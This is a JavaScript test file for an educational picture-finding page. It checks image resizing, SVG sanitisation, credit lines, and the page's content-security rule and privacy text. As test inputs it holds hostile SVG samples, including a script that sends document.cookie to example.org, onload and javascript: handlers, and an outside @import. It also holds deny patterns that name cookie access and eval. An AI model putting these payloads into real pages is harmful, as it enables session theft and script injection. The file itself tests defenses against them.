    expect(log.made).toEqual([{ type: 'image/jpeg', quality: 0.85, width: 256, height: 192, white: true }]);
    // 4000 -> 2000 -> 1000 -> 500 -> 256: no single jump of more than three times.
    expect(log.draws.map((draw) => draw.dw)).toEqual([2000, 1000, 500, 256]);
    expect(log.bitmaps).toBe(1);
    expect(log.closed).toBe(1);
    expect(log.images).toEqual([]);
  });

  it('a drawing stays a PNG, a small picture is never enlarged, and the long side is 256 at most whatever is asked', async () => {
    const small = helperWindow({ bitmap: { width: 100, height: 50 } });
    expect(await small.store.resizeToDataUri(small.file([new Uint8Array(900)], 'sun.png', 'image/png'), 256)).toMatch(/^data:image\/png;base64,/);
    expect(small.log.made).toEqual([{ type: 'image/png', quality: undefined, width: 100, height: 50, white: false }]);
    const tall = helperWindow({ bitmap: { width: 600, height: 1200 } });
    await tall.store.resizeToDataUri(tall.file([new Uint8Array(900)], 'sun.webp', 'image/webp'), 2000);
    expect([tall.log.made[0].width, tall.log.made[0].height]).toEqual([128, 256]);
    const less = helperWindow({ bitmap: { width: 600, height: 1200 } });
    await less.store.resizeToDataUri(less.file([new Uint8Array(900)], 'sun.png', 'image/png'), 64);
    expect([less.log.made[0].width, less.log.made[0].height]).toEqual([32, 64]);
    const unset = helperWindow({ bitmap: { width: 1024, height: 1024 } });
    await unset.store.resizeToDataUri(unset.file([new Uint8Array(900)], 'sun.png', 'image/png'));
    expect([unset.log.made[0].width, unset.log.made[0].height]).toEqual([256, 256]);
  });

  it('a photo that arrives in another format is written as a JPEG when that is far smaller; a symbol, and anything see-through, stays a PNG', async () => {
    const sizes = (pngBytes, jpegBytes) => (type) => (type === 'image/png' ? pngBytes : jpegBytes);
    // A WebP photo, every dot solid: 80 KB as a PNG, 12 KB as a JPEG.
    const photo = helperWindow({ bitmap: { width: 600, height: 400 }, dots: 'solid', bytes: sizes(80000, 12000) });
    expect(await photo.store.resizeToDataUri(photo.file([new Uint8Array(900)], 'cat.webp', 'image/webp'), 256)).toMatch(/^data:image\/jpeg;base64,/);
    expect(photo.log.made.map((made) => [made.type, made.white])).toEqual([['image/png', false], ['image/jpeg', true]]);
    // A flat symbol, every dot solid: the JPEG is not much smaller, so the sharper PNG is kept.
    const symbol = helperWindow({ bitmap: { width: 256, height: 256 }, dots: 'solid', bytes: sizes(9000, 7000) });
    expect(await symbol.store.resizeToDataUri(symbol.file([new Uint8Array(900)], 'cat.png', 'image/png'), 256)).toMatch(/^data:image\/png;base64,/);
    // See-through dots: never a JPEG, which would paint them white. The JPEG is not even made.
    const clear = helperWindow({ bitmap: { width: 256, height: 256 }, dots: 'clear', bytes: sizes(80000, 12000) });
    expect(await clear.store.resizeToDataUri(clear.file([new Uint8Array(900)], 'cat.png', 'image/png'), 256)).toMatch(/^data:image\/png;base64,/);
    expect(clear.log.made.map((made) => made.type)).toEqual(['image/png']);
  });

  it('an image that is already loaded is drawn as it is', async () => {
    const { store, log, window } = helperWindow({});
    const uri = await store.resizeToDataUri({ naturalWidth: 512, naturalHeight: 256 }, 256);
    expect(uri).toMatch(/^data:image\/png;base64,/);
    expect([log.made[0].width, log.made[0].height]).toEqual([256, 128]);
    expect((await refusal(store.resizeToDataUri(window.document.createElement('img'), 256))).code).toBe('not_a_picture');
  });

  it('a PNG that is too large is written as a JPEG on white, and a picture too large in every form is refused', async () => {
    const big = helperWindow({ bitmap: { width: 256, height: 256 }, bytes: (type, quality) => (type === 'image/png' ? 300000 : quality > 0.8 ? 250000 : 90000) });
    const uri = await big.store.resizeToDataUri(big.file([new Uint8Array(900)], 'map.png', 'image/png'), 256);
    expect(uri.startsWith('data:image/jpeg;base64,')).toBe(true);
    expect(big.log.made.map((made) => [made.type, made.quality, made.white])).toEqual([['image/png', undefined, false], ['image/jpeg', 0.85, true], ['image/jpeg', 0.7, true]]);
    expect(big.store.dataUriBytes(uri)).toBeLessThanOrEqual(big.store.LIMITS.pictureBytes);
    const huge = helperWindow({ bitmap: { width: 256, height: 256 }, bytes: () => 300000 });
    const error = await refusal(huge.store.resizeToDataUri(huge.file([new Uint8Array(900)], 'map.png', 'image/png'), 256));
    expect(error.code).toBe('picture_too_big');
    expect(error.message).toBe('The picture is too large to keep, even when made smaller.');
  });

  it('a plain SVG drawing stays an SVG, as text', async () => {
    const { store, log, file } = helperWindow({});
    const withProlog = String.fromCharCode(0xFEFF) + '<?xml version="1.0" encoding="UTF-8"?>\n<!-- a cat -->\n' + PLAIN_SVG + '\n';
    const uri = await store.resizeToDataUri(file([withProlog], 'cat.svg', 'image/svg+xml'), 256);
    expect(uri).toBe(svgUri(PLAIN_SVG));
    expect(log.made).toEqual([]);
    expect(log.images).toEqual([]);
    // The store takes it as it is.
    const kept = await store.create({ indexedDB: fakeIndexedDB() }).put('cat', { picture: { dataUri: uri, credit: CREDIT } });
    expect(kept.picture.dataUri).toBe(uri);
    // A drawing named .svg with no type from the device is read the same way.
    expect(await store.resizeToDataUri(file([PLAIN_SVG], 'cat.SVG', ''), 256)).toBe(svgUri(PLAIN_SVG));
  });

  it('an SVG with a script, an outside reference or an event handler never stays an SVG: it is drawn to a PNG', async () => {
    const unsafe = {
      'a script': '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://example.org/?" + document.cookie)</script><circle r="4"/></svg>',
      'an event handler': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="4"/></svg>',
      'an outside picture': '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.org/track.png" width="9" height="9"/></svg>',
      'a script address': '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><circle r="4"/></a></svg>',
      'a document type': '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd"><svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>',
      'a style that loads': '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://example.org/a.css);</style><circle r="4"/></svg>',
    };
    for (const [what, svg] of Object.entries(unsafe)) {
      const { store, log, file } = helperWindow({ image: { width: 0, height: 0 } });
      const uri = await store.resizeToDataUri(file([svg], 'x.svg', 'image/svg+xml'), 256);
      expect(uri.startsWith('data:image/png;base64,'), what).toBe(true);
      // It was shown to the browser as an image (where no script runs and nothing loads), then drawn.
      expect(log.images.length, what).toBe(1);
      expect(log.images[0].startsWith('data:image/svg+xml;base64,'), what).toBe(true);
      expect(log.bitmaps, what).toBe(0);
      // A drawing with no size of its own becomes a 256 pixel square.
      expect([log.made[0].width, log.made[0].height], what).toEqual([256, 256]);
      expect(Buffer.from(uri.split(',')[1], 'base64').toString('latin1'), what).not.toMatch(/script|onload|example\.org/);
    }
    // A plain drawing that is too large to keep as text is drawn too.
    const { store, log, file } = helperWindow({ image: { width: 800, height: 400 } });
    const large = '<svg xmlns="http://www.w3.org/2000/svg"><path d="' + 'M1 1L2 2'.repeat(30000) + '"/></svg>';
    expect(store.svgRefusal(large)).toBe('');
    expect(await store.resizeToDataUri(file([large], 'big.svg', 'image/svg+xml'), 256)).toMatch(/^data:image\/png;base64,/);
    expect([log.made[0].width, log.made[0].height]).toEqual([256, 128]);
  });

  it('refuses what is not a picture, and says why in plain words; it never throws', async () => {
    const { store, file, window } = helperWindow({ bitmap: undefined, image: null });
    const cases = [
      ['not_a_picture', null], ['not_a_picture', undefined], ['not_a_picture', file([], 'empty.png', 'image/png')],
      ['not_a_picture', file(['hello'], 'notes.txt', 'text/plain')], ['not_a_picture', file(['<p>hi</p>'], 'page.html', 'text/html')],
      ['not_a_picture', file(['<p>not a drawing</p>'], 'fake.svg', 'image/svg+xml')],
      ['not_a_picture', file(['junk that is not a picture'], 'broken.png', 'image/png')],      // the browser cannot decode it
      ['not_a_picture', {}], ['not_a_picture', 'cat.png'],
    ];
    for (const [code, source] of cases) {
      let call;
      expect(() => { call = store.resizeToDataUri(source, 256); }).not.toThrow();
      const error = await refusal(call);
      expect(error?.code, String(source && (source.name || source))).toBe(code);
      expect(error.message).toMatch(/^[A-Z].*\.$/);
    }
    const tooLarge = Object.assign(file(['x'], 'huge.jpg', 'image/jpeg'), {});
    Object.defineProperty(tooLarge, 'size', { value: 30 * 1024 * 1024 });
    expect((await refusal(store.resizeToDataUri(tooLarge, 256))).code).toBe('picture_too_big');
    expect(window.document.querySelectorAll('canvas, img').length).toBe(0);
  });

  it('a picture the browser will not let a page copy is refused as "cannot copy"', async () => {
    const { store, file } = helperWindow({ bitmap: { width: 300, height: 300 }, tainted: true });
    const error = await refusal(store.resizeToDataUri(file([new Uint8Array(90)], 'cat.png', 'image/png'), 256));
    expect(error.code).toBe('cannot_copy');
    expect(error.message).toBe('This picture cannot be copied: the site it comes from does not allow it.');
  });

  it('where the browser has no createImageBitmap, the file is read into an image through a data: address', async () => {
    const { store, log, file } = helperWindow({ bitmap: null, image: { width: 640, height: 480 } });
    const uri = await store.resizeToDataUri(file([new Uint8Array(64)], 'cat.jpg', 'image/jpeg'), 256);
    expect(uri.startsWith('data:image/jpeg;base64,')).toBe(true);
    expect(log.images.length).toBe(1);
    expect(log.images[0].startsWith('data:image/jpeg;base64,')).toBe(true);
    expect([log.made[0].width, log.made[0].height]).toEqual([256, 192]);
  });
});

describe('creditLine: one plain sentence for "About this file"', () => {
  it('names the picture, who made it, its license and where it is from, with no web address scheme', () => {
    expect(myWords.creditLine({ ...CREDIT, resized: true })).toBe('"Six weeks old cat" by Ada Poe, CC BY-SA 2.5 (creativecommons.org/licenses/by-sa/2.5), from Wikimedia Commons (commons.wikimedia.org/wiki/File:Six_weeks_old_cat_(aka).jpg), made smaller.');
    expect(myWords.creditLine(CREDIT)).toBe('"Six weeks old cat" by Ada Poe, CC BY-SA 2.5 (creativecommons.org/licenses/by-sa/2.5), from Wikimedia Commons (commons.wikimedia.org/wiki/File:Six_weeks_old_cat_(aka).jpg).');
    expect(myWords.creditLine({ own: true })).toBe("The teacher's own picture.");
    expect(myWords.creditLine({ title: 'Sun', license: 'CC0' })).toBe('"Sun", CC0.');
    expect(myWords.creditLine({ author: 'Sam Lee Jr.', license: 'Public domain', source: 'Openverse' })).toBe('Picture by Sam Lee Jr., Public domain, from Openverse.');
    expect(myWords.creditLine({ license: 'CC BY 4.0', sourceUrl: 'https://example.org/sun' })).toBe('Picture, CC BY 4.0, from example.org/sun.');
    expect(myWords.creditLine({ title: 'The "big" cat', author: 'Ada', license: 'CC BY 4.0' })).toBe("\"The 'big' cat\" by Ada, CC BY 4.0.");
    for (const none of [null, undefined, '', 'CC BY', 7, []]) expect(myWords.creditLine(none)).toBe('');
  });

  it('holds no scheme and no double slash, whatever a title or a name carries, and is one line', () => {
    const line = myWords.creditLine({ title: 'see https://evil.example.org/x and //cdn.example.org/y', author: 'http://a.example.org\n<b>Ada</b>', license: 'CC BY 4.0',
      licenseUrl: 'https://creativecommons.org/licenses/by/4.0/', source: 'ftp://files.example.org', sourceUrl: 'javascript://example.org/%0Aalert(1)' });
    expect(addresses(line)).toEqual([]);
    expect(line).not.toMatch(/https?:|\/\/|[\r\n]/);
    expect(line.endsWith('.')).toBe(true);
    // What the store kept, read back, makes the same sentence.
    expect(myWords.creditLine(JSON.parse(JSON.stringify({ ...CREDIT, resized: true })))).toContain('made smaller.');
  });
});

// ---------------------------------------------------------------------------------------------------------------
// The page "Find a picture", read as files
// ---------------------------------------------------------------------------------------------------------------
const page = () => new JSDOM(read(PAGE)).window.document;
const ruleOf = (doc) => doc.querySelector('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
const directive = (rule, name) => (rule.split(';').map((part) => part.trim().split(/\s+/)).find((part) => part[0] === name) || []).slice(1);

describe('the page as files: the one page that may reach other websites', () => {
  it('carries a rule that names exactly the hosts it uses, before anything is loaded', () => {
    const doc = page();
    const rule = ruleOf(doc);
    expect(rule).toBe(CSP);
    const head = [...doc.head.children];
    const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]');
    expect(head.slice(0, head.indexOf(meta)).every((node) => node.tagName === 'META')).toBe(true);
    expect(doc.querySelector('meta[name="referrer"]').getAttribute('content')).toBe('no-referrer');
    expect(directive(rule, 'default-src')).toEqual(["'none'"]);
    expect(directive(rule, 'script-src')).toEqual(["'self'"]);
    expect(directive(rule, 'style-src')).toEqual(["'self'"]);
    expect(directive(rule, 'form-action')).toEqual(["'none'"]);
    expect(directive(rule, 'base-uri')).toEqual(["'none'"]);
    // It may connect to the five hosts and to nothing else: not even to this site.
    expect(directive(rule, 'connect-src')).toEqual(ALL_HOSTS.map((host) => 'https://' + host));
    // It may show pictures from this site, from data: addresses (the saved ones) and from the hosts that serve pictures.
    expect(directive(rule, 'img-src')).toEqual(["'self'", 'data:', ...PICTURE_HOSTS.map((host) => 'https://' + host)]);
    expect(rule).not.toMatch(/unsafe|\*|blob:|http:|wss?:/);
    for (const name of ['frame-src', 'media-src', 'font-src', 'object-src', 'worker-src']) expect(directive(rule, name), name).toEqual([]);
    // The script asks only for those hosts, and the two lists in the script are the two lists in the rule.
    expect(pictures.HOSTS.search).toEqual(SEARCH_HOSTS);
    expect(pictures.HOSTS.pictures).toEqual(PICTURE_HOSTS);
    expect([...new Set([...pictures.HOSTS.search, ...pictures.HOSTS.pictures])].sort()).toEqual([...ALL_HOSTS].sort());
    for (const service of ['globalsymbols', 'openverse', 'commons']) expect(SEARCH_HOSTS).toContain(new URL(pictures.searchAddress(service, 'cat')).hostname);
  });

  it('has no inline script, no inline style and no inline handler, and nothing to sign in to', () => {
    const doc = page();
    expect(doc.querySelectorAll('style').length).toBe(0);
    expect([...doc.querySelectorAll('script')].map((script) => script.getAttribute('src'))).toEqual(['packets-page.js', STORE, SCRIPT]);
    for (const script of doc.querySelectorAll('script')) {
      expect(script.textContent.trim()).toBe('');
      expect(script.hasAttribute('defer')).toBe(true);
    }
    for (const node of doc.querySelectorAll('*')) {
      for (const attribute of node.attributes) {
        expect(/^on|^style$/i.test(attribute.name), node.tagName + ' ' + attribute.name).toBe(false);
        expect(/^\s*javascript:/i.test(attribute.value)).toBe(false);
      }
    }
    expect(doc.querySelector('form, input[type="password"], input[type="email"], iframe, object, embed')).toBeNull();
    expect(read(STYLES)).not.toMatch(/@import|url\(|@font-face|expression\(/i);
    expect([...doc.querySelectorAll('link[rel="stylesheet"]')].map((link) => link.getAttribute('href'))).toEqual(['packets.css', STYLES]);
    expect([...doc.querySelectorAll('link[rel="icon"]')].map((link) => link.getAttribute('href'))).toEqual(['packets-mark.svg']);
    expect(read(PAGE)).not.toMatch(/shared\.css|site\.js|lucide|fonts\.g|unpkg|promo|allobot/i);
  });

  it('uses only relative addresses in the page, and the web addresses in its files are the ones listed, each for a stated reason', () => {
    const doc = page();
    for (const node of doc.querySelectorAll('[href], [src]')) {
      const address = node.getAttribute('href') || node.getAttribute('src');
      expect(address).toMatch(/^(?:#[\w-]+|\.\/|[\w.-]+(?:\/[\w.-]+)*(?:#[\w-]+)?)$/);
      if (address[0] === '#') expect(doc.getElementById(address.slice(1)), address).toBeTruthy();
      else expect(existsSync(address === './' ? 'index.html' : address.replace(/#.*$/, '')), address).toBe(true);
    }
    // In the page: only inside the rule. Outside the rule the hosts are written as names, never as addresses.
    expect(addresses(read(PAGE).replace(CSP, ''))).toEqual([]);
    expect(addresses(read(STORE))).toEqual([]);
    expect(addresses(read(STYLES))).toEqual([]);
    const allowed = {
      'https://globalsymbols.com/api/v1/labels/search': 'asked for: the symbol search',
      'https://globalsymbols.com/symbolsets/': 'never asked for: the start of a symbol set\'s page, written into a credit',
      'https://api.openverse.org/v1/images/': 'asked for: the picture search, and each small picture under it',
      'https://commons.wikimedia.org/w/api.php': 'asked for: the picture search',
      'https://creativecommons.org/': 'never asked for: the start of a license address, written into a credit',
    };
    const inCode = read(SCRIPT).split('\n').filter((line) => !line.trim().startsWith('//')).join('\n');
    expect([...new Set(addresses(inCode))].sort()).toEqual(Object.keys(allowed).sort());
    // creativecommons.org is not in the rule, so the browser would refuse it even if the script asked.
    expect(CSP).not.toContain('creativecommons.org');
  });

  it('the script makes one kind of request, without cookies and without a referrer, and never builds markup from what comes back', () => {
    const script = read(SCRIPT);
    expect(script.match(/\bfetch\(/g)).toEqual(['fetch(']);
    expect(script).toContain("var options = { method: 'GET', mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer' };");
    expect(script).toContain('return root.fetch(address, options)');
    expect(script).not.toMatch(/XMLHttpRequest|WebSocket|EventSource|sendBeacon|\bimport\s*\(|\.\s*cookie\b|getUserMedia|serviceWorker|RTCPeerConnection|indexedDB|sessionStorage|window\.open|postMessage|importScripts|createObjectURL/);
    expect(script).not.toMatch(/innerHTML|outerHTML|insertAdjacentHTML|document\.write|DOMParser|createContextualFragment|parseFromString|srcdoc|\.cssText|\beval\s*\(|new\s+Function|setTimeout\s*\(\s*['"]/);
    expect(script).not.toMatch(/method\s*:\s*'(?!GET')|body\s*:|FormData|headers\s*:/);
    // Every element is made with a tag the script names itself.
    const made = [...script.matchAll(/\bel\(([^,)]*)/g)].map((m) => m[1]);
    expect([...new Set(made)].sort()).toEqual(["'button'", "'img'", "'li'", "'p'"]);
    expect(script.match(/createElement(?:NS)?\(/g)).toEqual(['createElement(']);
    // A picture address is set in three places: a result (an address checked against the named hosts) and two saved pictures (data: addresses).
    expect(script.match(/[\w$().'-]+\.src = [\w.]+/g)).toEqual(["$('saved-picture').src = picture.dataUri", 'image.src = picture.show', 'image.src = entry.picture.dataUri']);
    expect(script).not.toMatch(/\.(?:href|action|srcset)\s*=[^=]/);
    // Local storage holds one setting, under one key, and only when the teacher asks.
    expect(script.match(/\.setItem\(/g)).toEqual(['.setItem(']);
    expect(script).toContain("place.setItem(KEEP_KEY, JSON.stringify({ online: true }))");
    expect(pictures.KEEP_KEY).toBe('alloflow-packets-pictures/1');
    // No script the page loads sets a cookie or loads an analytics or tracking library.
    for (const file of ['packets-page.js', STORE, SCRIPT]) expect(read(file), file).not.toMatch(/document\.cookie\s*=|google-analytics|googletagmanager|gtag\(|plausible\.io|segment\.com|hotjar|mixpanel|sentry\.io/i);
  });

  it('the "See the details" strip says plainly what this page can reach, what it sends and what it keeps', () => {
    const doc = page();
    const strip = doc.querySelector('details.proof');
    expect(strip.hasAttribute('open')).toBe(false);
    expect(strip.querySelector('.proof-line').textContent).toBe('This page runs without AI. No account. It can search three named websites for pictures, and only after you turn that on.');
    const said = (id) => doc.getElementById(id).textContent.replace(/\s+/g, ' ').trim();
    // Unlike most pages, it can reach other websites. 2026-11-13 (teacher-journey pass): Look up a word online and Open a practice file
    // can reach one other site each (packets-it.html says which), so "the other pages cannot connect" was no longer true.
    expect(said('proof-reach')).toBe('This page, unlike most Packets pages, can reach other websites. Most of the other pages cannot connect to any other website: the guide for school IT names the two that can, and what they send. This one can connect to the five addresses listed here, and to nothing else: the rule below names them, and the browser refuses everything the rule does not name.');
    // Every host in the rule is listed by name, and no other.
    expect([...doc.querySelectorAll('#proof-hosts code')].map((code) => code.textContent)).toEqual(ALL_HOSTS);
    expect(said('proof-hosts')).toBe('Global Symbols: globalsymbols.com. Openverse: api.openverse.org. Wikimedia Commons: commons.wikimedia.org, with its picture files at thumb.wikimedia.org and upload.wikimedia.org.');
    expect(said('proof-when')).toBe('Nothing is sent when the page opens, and nothing is sent while Search for pictures online is off. A search starts only when you press Search.');
    expect(said('proof-sent')).toBe('A search sends only the word you search for to those three services. Then the browser asks them for the pictures it shows. Nothing about your students, your other words or your files is sent. No cookies are sent, and no account is used.');
    expect(said('proof-ip')).toBe("Like any web request, each one carries your IP address and your browser type to that service. The browser also tells the service which website asked: this site's address, not the page and not what is on it. Each service keeps its own records, under its own privacy policy.");
    expect(said('proof-licenses')).toBe('Only pictures that state a license that allows copying with credit are shown: public domain, CC0, CC BY and CC BY-SA. Pictures labeled as not for commercial use or as not to be changed are left out, and so are pictures with no stated license.');
    expect(said('proof-made')).toBe('Pictures and symbol sets labeled as made with AI are left out. A picture that is not labeled that way cannot be told apart.');
    const items = [...strip.querySelectorAll('.proof-body li')].map((item) => item.textContent.replace(/\s+/g, ' ').trim());
    expect(items).toContain('A picture from your device is read in this browser and is not uploaded.');
    expect(items).toContain("A picture you choose is made small (256 pixels at most) and kept, with its credit, in this browser's storage for this site (IndexedDB), on this device only. Remove and Remove all delete it.");
    expect(items).toContain("The switch is remembered only if you turn on Keep this on, on this device. That one setting is then kept in this browser's local storage. On a shared computer, leave it off.");
    expect(items).toContain('There are no cookies and nothing to sign in to.');
    expect(items).toContain('Like any website, the server that sends these files can see that your browser asked for them. It does not see your word: the part of an address after the # sign is never sent.');
    // The files it says it loads are the files it loads.
    const loaded = [...doc.querySelectorAll('link[rel="stylesheet"], script[src]')].map((node) => node.getAttribute('href') || node.getAttribute('src'));
    expect([...doc.querySelectorAll('#proof-files code')].map((code) => code.textContent)).toEqual(loaded);
    expect(said('proof-files')).toContain('This page loads seven files, all from this site: the page itself, two stylesheets');
    expect(1 + loaded.length + 1).toBe(7);
    // The rule is shown word for word by packets-page.js.
    const { window } = new JSDOM(read(PAGE), { runScripts: 'outside-only' });
    window.eval(read('packets-page.js'));
    expect(window.document.querySelector('[data-show-rule]').textContent).toBe(CSP);
    expect(window.document.title).toBe(NAME + ': Find a picture');
    // The numbers in the strip are the store's numbers.
    expect(myWords.LIMITS.pictureSide).toBe(256);
  });

  it('says before anything is sent what will be sent, with the switch off', () => {
    const doc = page();
    const online = doc.getElementById('online-on');
    expect(online.getAttribute('type')).toBe('checkbox');
    expect(online.getAttribute('role')).toBe('switch');
    expect(online.hasAttribute('checked')).toBe(false);
    expect(online.closest('label').textContent.trim()).toBe('Search for pictures online');
    expect(doc.getElementById(online.getAttribute('aria-describedby')).textContent).toBe('Only the word you search for is sent to the services named here. Nothing about your students is sent.');
    expect([...doc.querySelectorAll('#services li strong')].map((node) => node.textContent)).toEqual(['Global Symbols', 'Openverse', 'Wikimedia Commons']);
    expect(pictures.SERVICES.map((service) => service.name)).toEqual(['Global Symbols', 'Openverse', 'Wikimedia Commons']);
    const keep = doc.getElementById('online-keep');
    expect(keep.hasAttribute('checked')).toBe(false);
    expect(keep.closest('label').textContent.trim()).toBe('Keep this on, on this device');
    // The search button and the "keep" box are not shown until the switch is on.
    expect(doc.getElementById('online-more').hasAttribute('hidden')).toBe(true);
    expect(doc.getElementById('online-more').contains(doc.getElementById('search'))).toBe(true);
    expect(doc.getElementById('results').hasAttribute('hidden')).toBe(true);
    // The groups, in order: the teacher's own device first, then the three services.
    expect([...doc.querySelectorAll('main h2, main h3')].map((node) => node.textContent)).toEqual(['Saved', 'From my device', 'Search online', 'Pictures', 'Global Symbols', 'Openverse', 'Wikimedia Commons', 'My pictures']);
    expect(doc.getElementById('look').textContent).toBe('These pictures come from public collections. Nobody has checked them for you. Look at each one before you use it.');
    // Openverse asks a page that uses it to say so, and to say it is not endorsed.
    expect(doc.querySelector('#group-openverse .hint').textContent).toBe('This search uses Openverse. This page is not endorsed or certified by Openverse.');
    expect(doc.querySelector('#saved a.btn').getAttribute('href')).toBe('packets-make.html');
    expect(doc.querySelector('#saved a.btn').textContent).toBe('Back to the maker');
    // No picture is in the page as it arrives.
    expect([...doc.querySelectorAll('img')].map((image) => image.getAttribute('src'))).toEqual([null]);
  });

  it('has one h1, ordered headings, named controls, a live region and the look of the other pages', () => {
    const doc = page();
    const levels = [...doc.querySelectorAll('h1, h2, h3, h4, h5, h6')].map((node) => Number(node.tagName[1]));
    expect(levels.filter((level) => level === 1)).toEqual([1]);
    expect(levels[0]).toBe(1);
    levels.forEach((level, i) => { if (i) expect(level - levels[i - 1]).toBeLessThanOrEqual(1); });
    const named = (node) => {
      if ((node.getAttribute('aria-label') || '').trim()) return true;
      if (node.id && doc.querySelector('label[for="' + node.id + '"]')?.textContent.trim()) return true;
      return !!node.closest('label')?.textContent.trim();
    };
    for (const node of doc.querySelectorAll('input, select, textarea')) expect(named(node), node.outerHTML.slice(0, 80)).toBe(true);
    for (const node of doc.querySelectorAll('button, a[href]')) expect(node.textContent.trim().length, node.outerHTML.slice(0, 80)).toBeGreaterThan(0);
    for (const node of doc.querySelectorAll('button')) expect(node.getAttribute('type')).toBe('button');
    for (const node of doc.querySelectorAll('[aria-describedby], [aria-labelledby]')) {
      for (const id of (node.getAttribute('aria-describedby') || node.getAttribute('aria-labelledby')).split(/\s+/)) expect(doc.getElementById(id), '#' + id).toBeTruthy();
    }
    expect(new Set([...doc.querySelectorAll('[id]')].map((node) => node.id)).size).toBe(doc.querySelectorAll('[id]').length);
    expect(doc.documentElement.getAttribute('lang')).toBe('en');
    expect(doc.querySelectorAll('main').length).toBe(1);
    expect(doc.querySelector('a.skip').getAttribute('href')).toBe('#main');
    expect(doc.querySelector('header.top') && doc.querySelector('main#main') && doc.querySelector('footer.foot')).toBeTruthy();
    expect(doc.querySelector('meta[name="viewport"]').getAttribute('content')).not.toMatch(/user-scalable|maximum-scale/);
    expect([...doc.querySelectorAll('footer a')].map((link) => link.textContent)).toEqual(['More from AlloFlow']);
    // Messages are announced: one quiet region for the page, and the line that confirms a save.
    expect(doc.getElementById('said').getAttribute('role')).toBe('status');
    expect(doc.getElementById('said').className).toBe('sr-only');
    expect(doc.getElementById('saved-line').getAttribute('role')).toBe('status');
    // A heading the page moves focus to is not a control.
    for (const node of doc.querySelectorAll('[tabindex]')) {
      expect(node.getAttribute('tabindex')).toBe('-1');
      expect(node.matches('h2')).toBe(true);
    }
    // The product name is written once; the header's top row is the results page's, word for word. (Since 2026-11-12 each page's
    // own "See the details" strip sits inside its header too, so that it is in a landmark; that part differs from page to page.)
    expect(read(PAGE).split(NAME).length - 1).toBe(1);
    expect(doc.getElementById('product-name').textContent).toBe(NAME);
    for (const file of [SCRIPT, STORE, STYLES]) expect(read(file), file).not.toContain(NAME);
    const results = new JSDOM(read('packets-results.html')).window.document;
    expect(doc.querySelector('header.top .top-row').outerHTML).toBe(results.querySelector('header.top .top-row').outerHTML);
    expect([...doc.querySelector('header.top').children].map((node) => node.className)).toEqual(['wrap top-row', 'proof']);
    expect(doc.querySelector('footer.foot').outerHTML).toBe(results.querySelector('footer.foot').outerHTML);
    // Its own stylesheet takes colors, focus and motion from packets.css: no color of its own but white behind a picture.
    const styles = read(STYLES);
    expect([...new Set(styles.match(/#[0-9a-f]{3,8}\b/gi))]).toEqual(['#ffffff']);
    expect(styles).not.toMatch(/outline:\s*(?:none|0)/);
    expect(styles.match(/transition:/g).length).toBe(1);
    expect(styles).toMatch(/@media \(prefers-reduced-motion: no-preference\) \{\s*\.pic \{ transition:/);
    expect(styles).not.toMatch(/animation|position:\s*fixed|100vw/);
    expect(read(SCRIPT)).not.toMatch(/behavior:\s*'smooth'/);
  });

  it('promises nothing it cannot keep, says "AI" only to say none runs here, and uses American spelling', () => {
    for (const file of WRITTEN) expect(BRITISH.exec(read(file)), file).toBeNull();
    const doc = page();
    const visible = doc.body.textContent + ' ' + doc.querySelector('meta[name="description"]').getAttribute('content') + ' ' + doc.title;
    expect(visible).not.toMatch(/\bsecure|\bsafe\b|guarantee|FERPA|COPPA|compliant|\bverified\b|\bapproved\b/i);
    // "certified" appears once, in the sentence Openverse asks for: it says what this page is not.
    expect(visible.match(/certified/gi)).toEqual(['certified']);
    expect(visible).toContain('This page is not endorsed or certified by Openverse.');
    const strings = [...read(SCRIPT).matchAll(/'((?:[^'\\\n]|\\.)*)'/g)].map((m) => m[1]).join(' ') + ' ' + [...read(STORE).matchAll(/'((?:[^'\\\n]|\\.)*)'/g)].map((m) => m[1]).join(' ');
    expect(strings).not.toMatch(/\bsecure|\bsafe\b|guarantee|FERPA|certified|compliant/i);
    const sentences = (text) => text.replace(/\s+/g, ' ').trim().split(/(?<=[.!?])\s+/).filter((sentence) => /\bAI\b/.test(sentence));
    const allowed = ['Runs without AI.', 'This page runs without AI.', 'Pictures and symbol sets labeled as made with AI are left out.'];
    const BLOCK = 'title, h1, h2, h3, p, li, summary span, label, button';
    const blocks = [...doc.querySelectorAll(BLOCK)].filter((node) => !node.querySelector(BLOCK));
    const found = [...blocks.flatMap((node) => sentences(node.textContent)), ...sentences(doc.querySelector('meta[name="description"]').getAttribute('content'))];
    for (const sentence of found) expect(allowed, sentence).toContain(sentence);
    expect(found.length).toBe(4);
    // In the scripts the word appears in comments only: no line a visitor reads.
    for (const file of [SCRIPT, STORE]) for (const line of read(file).split('\n')) if (/\bAI\b/.test(line)) expect(line.trim().startsWith('//'), file + ': ' + line).toBe(true);
    expect(read(PAGE)).not.toMatch(/Gemini|ChatGPT|chatbot|generat(?:es|ive)|\bLLM\b/i);
    expect(doc.querySelector('meta[name="description"]').getAttribute('content')).toContain('Runs without AI. No accounts.');
  });
});

// ---------------------------------------------------------------------------------------------------------------
// Which pictures may be shown: the license, and the strictest setting each service has
// ---------------------------------------------------------------------------------------------------------------
const gsSet = (name, properties, extra = {}) => ({ id: 1, slug: name.toLowerCase().replace(/[^a-z0-9]+/g, '-'), name, publisher: name + ' team', publisher_url: 'https://example.org/', status: 'published',
  licence: { name: properties ? 'Creative Commons ' + properties.toUpperCase().replace(/-/g, ' ') + ' 4.0' : 'Public Domain', url: properties ? 'https://creativecommons.org/licenses/' + properties + '/4.0/' : null, version: properties ? '4.0' : null, properties }, ...extra });
const gsRow = (id, text, set, file = id + '.svg', host = 'globalsymbols.com') => ({ id, text, description: null, language: 'eng',
  picto: { id: 1000 + id, symbolset_id: 1, part_of_speech: 'noun', image_url: 'https://' + host + '/uploads/production/image/imagefile/' + id + '/' + file, native_format: file.split('.').pop(), adaptable: false, ...(set ? { symbolset: set } : {}) } });
const GS_ROWS = [
  gsRow(1, 'Cat Bed', gsSet('OpenMoji', 'by-sa')),
  gsRow(2, 'cat', gsSet('ARASAAC', 'by-nc-sa'), '2.png'),
